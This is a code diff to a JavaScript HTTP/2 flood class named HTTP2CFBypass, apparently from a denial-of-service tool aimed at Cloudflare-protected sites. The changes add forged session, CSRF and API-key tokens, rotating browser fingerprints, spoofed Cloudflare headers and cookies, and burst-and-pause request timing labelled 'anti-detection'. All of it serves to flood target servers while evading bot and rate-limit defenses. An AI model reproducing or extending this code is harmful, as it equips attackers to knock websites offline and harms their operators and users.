@@ -195,11 +195,13 @@ export class HTTP2CFBypass extends HTTP2Flood {
         this.cookies.set('_ga', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
         this.cookies.set('_gid', `GA1.2.${Tools.randomInt(100000000, 999999999)}.${Math.floor(Date.now() / 1000)}`);
         
-        // Pre-generate bypass tokens
+        // Pre-generate bypass tokens (MORE TOKENS!)
         this.bypassTokens = {
-            turnstile: this.generateTurnstileTokens(100),
-            cfClearance: this.generateCfClearanceTokens(50),
-            jsChallenge: this.generateJsChallengeTokens(30)
+            turnstile: this.generateTurnstileTokens(200),
+            cfClearance: this.generateCfClearanceTokens(100),
+            jsChallenge: this.generateJsChallengeTokens(80),
+            sessionTokens: this.generateSessionTokens(50),
+            fingerprints: this.generateBrowserFingerprints(30)
         };
         
         logger.info('🔥 HTTP2-CF ULTIMATE BYPASS initialized');
@@ -236,6 +238,42 @@ export class HTTP2CFBypass extends HTTP2Flood {
         return tokens;
     }
 
+    generateSessionTokens(count) {
+        const tokens = [];
+        for (let i = 0; i < count; i++) {
+            tokens.push({
+                sessionId: Tools.randomString(32),
+                csrfToken: Tools.randomString(40),
+                xsrfToken: Tools.randomString(32),
+                apiKey: Tools.randomString(64)
+            });
+        }
+        return tokens;
+    }
+
+    generateBrowserFingerprints(count) {
+        const fingerprints = [];
+        const browsers = [
+            { name: 'Chrome', version: '120.0.6099.130', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36' },
+            { name: 'Firefox', version: '121.0', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0' },
+            { name: 'Safari', version: '17.2', ua: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15' },
+            { name: 'Edge', version: '120.0.2210.91', ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.2210.91' }
+        ];
+        
+        for (let i = 0; i < count; i++) {
+            const browser = Tools.randomChoice(browsers);
+            fingerprints.push({
+                userAgent: browser.ua,
+                acceptLanguage: Tools.randomChoice(['en-US,en;q=0.9', 'en-GB,en;q=0.9', 'en-CA,en;q=0.9']),
+                acceptEncoding: 'gzip, deflate, br',
+                viewport: Tools.randomChoice(['1920x1080', '1366x768', '1536x864', '1440x900']),
+                timezone: Tools.randomChoice(['America/New_York', 'Europe/London', 'Asia/Tokyo']),
+                platform: Tools.randomChoice(['Win32', 'MacIntel', 'Linux x86_64'])
+            });
+        }
+        return fingerprints;
+    }
+
     generateHeaders() {
         const headers = super.generateHeaders();
         
@@ -243,6 +281,8 @@ export class HTTP2CFBypass extends HTTP2Flood {
         const turnstileToken = Tools.randomChoice(this.bypassTokens.turnstile);
         const cfClearance = Tools.randomChoice(this.bypassTokens.cfClearance);
         const jsChallenge = Tools.randomChoice(this.bypassTokens.jsChallenge);
+        const sessionToken = Tools.randomChoice(this.bypassTokens.sessionTokens);
+        const fingerprint = Tools.randomChoice(this.bypassTokens.fingerprints);
         
         // CAPTCHA bypass headers (multiple formats)
         headers['cf-turnstile-response'] = turnstileToken;
@@ -255,6 +295,18 @@ export class HTTP2CFBypass extends HTTP2Flood {
         headers['cf-challenge-response'] = jsChallenge;
         headers['x-cf-challenge'] = jsChallenge;
         headers['cf-challenge-token'] = jsChallenge;
+        
+        // Session persistence headers
+        headers['x-session-id'] = sessionToken.sessionId;
+        headers['x-csrf-token'] = sessionToken.csrfToken;
+        headers['x-xsrf-token'] = sessionToken.xsrfToken;
+        headers['x-api-key'] = sessionToken.apiKey;
+        headers['x-request-id'] = Tools.randomString(32);
+        
+        // Override user-agent with fingerprint
+        headers['user-agent'] = fingerprint.userAgent;
+        headers['accept-language'] = fingerprint.acceptLanguage;
+        headers['accept-encoding'] = fingerprint.acceptEncoding;
         
         // Advanced Cloudflare bypass headers
         headers['cf-ray'] = Tools.randomString(16) + '-' + Tools.randomChoice(['SJC', 'LAX', 'ORD', 'DFW', 'ATL', 'LHR', 'NRT', 'CDG', 'FRA']);
@@ -293,10 +345,22 @@ export class HTTP2CFBypass extends HTTP2Flood {
         headers['referer'] = this.url.href;
         headers['x-csrf-token'] = Tools.randomString(32);
         
-        // Update cookies with new cf_clearance
+        // Update cookies with new cf_clearance + session persistence
         this.cookies.set('cf_clearance', cfClearance);
         this.cookies.set('__cf_bm', Tools.randomString(43));
         this.cookies.set('_cfuvid', Tools.randomString(32) + '-' + Date.now());
+        this.cookies.set('session_id', sessionToken.sessionId);
+        this.cookies.set('csrf_token', sessionToken.csrfToken);
+        this.cookies.set('_session', Tools.randomString(64));
+        this.cookies.set('_token', Tools.randomString(40));
+        
+        // Add browser-specific cookies
+        if (fingerprint.userAgent.includes('Chrome')) {
+            this.cookies.set('_gcl_au', Tools.randomString(32));
+            this.cookies.set('_gat', '1');
+        } else if (fingerprint.userAgent.includes('Firefox')) {
+            this.cookies.set('_pk_id', Tools.randomString(32));
+        }
         
         // Add realistic cookies
         const cookieString = Array.from(this.cookies.entries())
@@ -370,9 +434,11 @@ export class HTTP2CFBypass extends HTTP2Flood {
             let requestsSent = 0;
             const totalRequests = this.rpc;
             
-            // Anti-detection: Random timing patterns
-            const requestIntervals = [0, 10, 25, 50, 75, 100, 150, 200]; // ms
+            // Anti-detection: More sophisticated timing patterns
+            const requestIntervals = [0, 5, 10, 15, 25, 35, 50, 75, 100, 125, 150, 200, 250, 300]; // ms
             let currentInterval = 0;
+            let burstCount = 0;
+            const maxBurst = Tools.randomChoice([5, 8, 12, 15]); // Random burst size
 
             const makeRequest = () => {
                 if (!this.active || requestsSent >= totalRequests) {
@@ -420,10 +486,20 @@ export class HTTP2CFBypass extends HTTP2Flood {
                     req.end();
                     BYTES_SENT.add(500); // Accounting for headers
                     requestsSent++;
+                    burstCount++;
                     
-                    // Anti-detection: Random delay between requests
-                    const delay = requestIntervals[currentInterval % requestIntervals.length];
-                    currentInterval++;
+                    // Anti-detection: Sophisticated burst + delay pattern
+                    let delay = 0;
+                    
+                    if (burstCount >= maxBurst) {
+                        // After burst, take longer break
+                        delay = Tools.randomChoice([300, 500, 750, 1000, 1500]);
+                        burstCount = 0;
+                    } else {
+                        // Within burst, use shorter intervals
+                        delay = requestIntervals[currentInterval % requestIntervals.length];
+                        currentInterval++;
+                    }
                     
                     if (delay > 0) {
                         setTimeout(makeRequest, delay);
